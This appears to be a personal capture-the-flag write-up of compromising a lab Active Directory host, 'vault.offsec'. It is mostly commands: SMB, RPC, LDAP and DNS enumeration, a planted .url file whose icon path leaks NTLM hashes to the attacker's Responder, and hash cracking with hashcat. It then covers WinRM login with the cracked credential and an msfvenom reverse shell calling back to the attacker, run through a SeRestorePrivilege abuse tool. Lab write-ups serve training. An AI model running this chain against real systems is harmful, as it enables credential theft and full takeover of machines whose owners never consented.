# NMAP 

```
sudo nmap -sV -sC 192.168.120.172 -oN nmap-vault 
```

![[PG/Active Directory/attachments/Pasted image 20250707232105.png]]
- add vault.offsec and dc.vault.offsec to /etc/hosts

All ports
![[PG/Active Directory/attachments/Pasted image 20250707232444.png]]

UDP (nothing crazy)
![[PG/Active Directory/attachments/Pasted image 20250707233930.png]]
# SMB 

```
nxc smb 192.168.120.172 -u 'administrator' -p 'administrator' --shares
```

![[PG/Active Directory/attachments/Pasted image 20250707232330.png]]

![[PG/Active Directory/attachments/Pasted image 20250707232422.png]]

# RPC 

```
rpcclient -U '' 192.168.120.172
```

![[PG/Active Directory/attachments/Pasted image 20250707232639.png]]
```
enumdomusers
```
- did not work

![[PG/Active Directory/attachments/Pasted image 20250707233037.png]]

```
querydispinfo
```
- access denied

Rid brute force 👀

```
for i in $(seq 500 1100); do
    rpcclient -N -U "" 192.168.120.172 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
done
```
- this isn't doing anything 
# LDAP 

```
ldapsearch -x -H ldap://192.168.120.172 -x -s base
```

```
ldapsearch -x -H ldap://192.168.120.172 -x -b 'DC=vault,DC=offsec'
```

![[PG/Active Directory/attachments/Pasted image 20250707234248.png]]
- boo

# Back to SMB

Messing with nxc command 

```
nxc smb 192.168.120.172 -u '.' -p '.' --shares
```
![[PG/Active Directory/attachments/Pasted image 20250707235059.png]]
- gives me a guest authentication but still can't see shares 

### SMBMAP 

```
smbmap -u '' -H 192.168.120.172
```

![[PG/Active Directory/attachments/Pasted image 20250707235227.png]]
- nothing

```
smbmap -u '.' -H 192.168.120.172
```

![[PG/Active Directory/attachments/Pasted image 20250707235302.png]]
- Something 👀
- See a DocumentShare

Read share contents

```
smbmap -u '.' -H 192.168.120.172 -r DocumentsShare --depth 10
```

![[PG/Active Directory/attachments/Pasted image 20250707235627.png]]
- looks like there is nothing in this share
- but we do have write access.. could I write something?

Confirm nothing here with smbclient 

```
smbclient -U '.' //192.168.120.172/DocumentsShare
```


# Kerbrute for funnnnn

```
~/Tools/AD-Enumeration/kerbrute/dist/kerbrute_linux_arm64 userenum --dc 192.168.120.172 -d vault.offsec /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![[PG/Active Directory/attachments/Pasted image 20250708001159.png]]

# DNS

Ref - https://hacktricks.boitatech.com.br/pentesting/pentesting-dns

Looking for TXT records
```
dig TXT @192.168.120.172 vault.offsec
```

Actually found another virtual host 

```
hostmaster.vault.offsec
```

![[PG/Active Directory/attachments/Pasted image 20250708001751.png]]

```
dig ANY @192.168.120.172 vault.offsec
```
![[PG/Active Directory/attachments/Pasted image 20250708001919.png]]
- add hostmaster.vault.offsec to /etc/hosts

# Back to SMB 

Exploiting the SMB Put file share functionality by creating malicious icon file that will call back to our machines and leak NTLM creds.. we'll use responder to catch the NTLM hash.

Paste the below code into a file called ‘Evil.url’

```
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\192.168.45.152\%USERNAME%.icon
IconIndex=1
```

Start responder 

![[PG/Active Directory/attachments/Pasted image 20250708003110.png]]

Log back in with smbclient 

```
smbclient -U '.' //192.168.120.172/DocumentsShare
```

Put evil.url on the share and check responder 

![[PG/Active Directory/attachments/Pasted image 20250708003311.png]]

Wooooooooooooooo
![[PG/Active Directory/attachments/Pasted image 20250708003340.png]]

Got a hash :) and a user: `anirudh`

Save hash to a file to crack.

# Crack NTLMv2 

```
hashcat -m 5600 ani.hash /usr/share/wordlists/rockyou.txt --force
```

And it cracked 

![[PG/Active Directory/attachments/Pasted image 20250708003722.png]]
- `anirudh:SecureHM`

# Initial Access

```
nxc winrm 192.168.120.172 -u 'anirudh' -p 'SecureHM'
```

![[PG/Active Directory/attachments/Pasted image 20250708003944.png]]

## Evil-WinRM

```
evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'
```
![[PG/Active Directory/attachments/Pasted image 20250708004052.png]]

# Priv Esc 

We have a lot of interesting privileges (including the SeMachineAccountPrivilege)
![[PG/Active Directory/attachments/Pasted image 20250708004215.png]]

Maybe my trusty script will work again.....DOUBT 

## Priv Esc by Exploiting SeMachineAccountPrivilege

```
python3 noPac.py vault.offsec/anirudh:'SecureHM' -dc-ip 192.168.120.172 -shell --impersonate administrator -use-ldap
```

![[PG/Active Directory/attachments/Pasted image 20250708004537.png]]
- as expected.. did not work.

## SeBackupPrivilege 

This one is a goodie.. maybe we can save reg keys.

![[PG/Active Directory/attachments/Pasted image 20250708004932.png]]

Got some hashes
![[PG/Active Directory/attachments/Pasted image 20250708004951.png]]

BOOOO

```
nxc smb 192.168.120.172 -u Administrator -H 608339ddc8f434ac21945e026887dc36
```

![[PG/Active Directory/attachments/Pasted image 20250708005557.png]]

So only our user can access the box remotely 

```
net localgroup 'Remote Desktop Users'

net localgroup 'Remote Management Users'
```

Try to exploit the SeRestorePrivilege

# Priv Esc via SeRestorePrivilege 

Download this executable from GitHub https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------

Here is the usage 

![[PG/Active Directory/attachments/Pasted image 20250708010452.png]]

Generate a rev shell with msfvenom 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=1234 -f exe -o reverse.exe
```

Upload these two files to the box

Set up nc listener 

```
sudo rlwrap nc -lvnp 1234
```

```
.\SeRestoreAbuse.exe C:\Users\anirudh\Desktop\reverse.exe
```
![[PG/Active Directory/attachments/Pasted image 20250708011154.png]]

Got system 

![[PG/Active Directory/attachments/Pasted image 20250708011227.png]]

![[PG/Active Directory/attachments/Pasted image 20250708011400.png]]
